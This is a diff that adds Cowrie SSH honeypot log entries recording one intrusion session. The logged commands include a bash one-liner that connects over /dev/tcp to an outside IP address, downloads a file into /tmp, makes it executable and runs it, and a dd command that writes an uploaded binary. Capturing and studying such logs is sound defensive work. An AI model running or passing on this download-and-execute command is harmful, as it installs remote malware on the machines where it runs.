@@ -1,0 +1,46 @@
+[
+  {
+  "eventid":"cowrie.command.input",
+  "input":"nohup bash -c \"exec 6<>/dev/tcp/123.57.52.155/60138 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/H1TGXi2Rnq && chmod +x /tmp/H1TGXi2Rnq && /tmp/H1TGXi2Rnq QBDtzQ43FdbsDEBEF+TVCzEI26GkQRpHnnz5n4bQCw==\" &",
+  "message":"CMD: nohup bash -c \"exec 6<>/dev/tcp/123.57.52.155/60138 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/H1TGXi2Rnq && chmod +x /tmp/H1TGXi2Rnq && /tmp/H1TGXi2Rnq QBDtzQ43FdbsDEBEF+TVCzEI26GkQRpHnnz5n4bQCw==\" &",
+  "sensor":"1f06f30a4cfe",
+  "uuid":"d64dce96-e4a4-11f0-ba9a-a6b6eec8e0ac",
+  "timestamp":"2026-02-18T01:20:05.367220Z",
+  "src_ip":"123.57.52.155",
+  "session":"79f42a418477",
+  "protocol":"ssh"
+  },
+  {
+  "eventid":"cowrie.command.input",
+  "input":"dd bs=1 count=1911588 > /tmp/MjzhX6qnJn",
+  "message":"CMD: dd bs=1 count=1911588 > /tmp/MjzhX6qnJn",
+  "sensor":"1f06f30a4cfe",
+  "uuid":"d64dce96-e4a4-11f0-ba9a-a6b6eec8e0ac",
+  "timestamp":"2026-02-18T01:20:05.371323Z",
+  "src_ip":"123.57.52.155",
+  "session":"79f42a418477",
+  "protocol":"ssh"
+  },
+  {
+  "eventid":"cowrie.command.input",
+  "input":"nohup bash -c \"exec 6<>/dev/tcp/123.57.52.155/60138 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/H1TGXi2Rnq && chmod +x /tmp/H1TGXi2Rnq && /tmp/H1TGXi2Rnq QBDtzQ43FdbsDEBEF+TVCzEI26GkQRpHnnz5n4bQCw==\" &0O0O6(6(Qtd?UPX!",
+  "message":"CMD: nohup bash -c \"exec 6<>/dev/tcp/123.57.52.155/60138 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/H1TGXi2Rnq && chmod +x /tmp/H1TGXi2Rnq && /tmp/H1TGXi2Rnq QBDtzQ43FdbsDEBEF+TVCzEI26GkQRpHnnz5n4bQCw==\" &0O0O6(6(Qtd?UPX!",
+  "sensor":"1f06f30a4cfe",
+  "uuid":"d64dce96-e4a4-11f0-ba9a-a6b6eec8e0ac",
+  "timestamp":"2026-02-18T01:20:05.762923Z",
+  "src_ip":"123.57.52.155",
+  "session":"79f42a418477",
+  "protocol":"ssh"
+  },
+  {
+  "eventid":"cowrie.command.input",
+  "input":">D6@/XJ'8",
+  "message":"CMD: >D6@/XJ'8",
+  "sensor":"1f06f30a4cfe",
+  "uuid":"d64dce96-e4a4-11f0-ba9a-a6b6eec8e0ac",
+  "timestamp":"2026-02-18T01:20:05.771438Z",
+  "src_ip":"123.57.52.155",
+  "session":"79f42a418477",
+  "protocol":"ssh"
+  }
+]
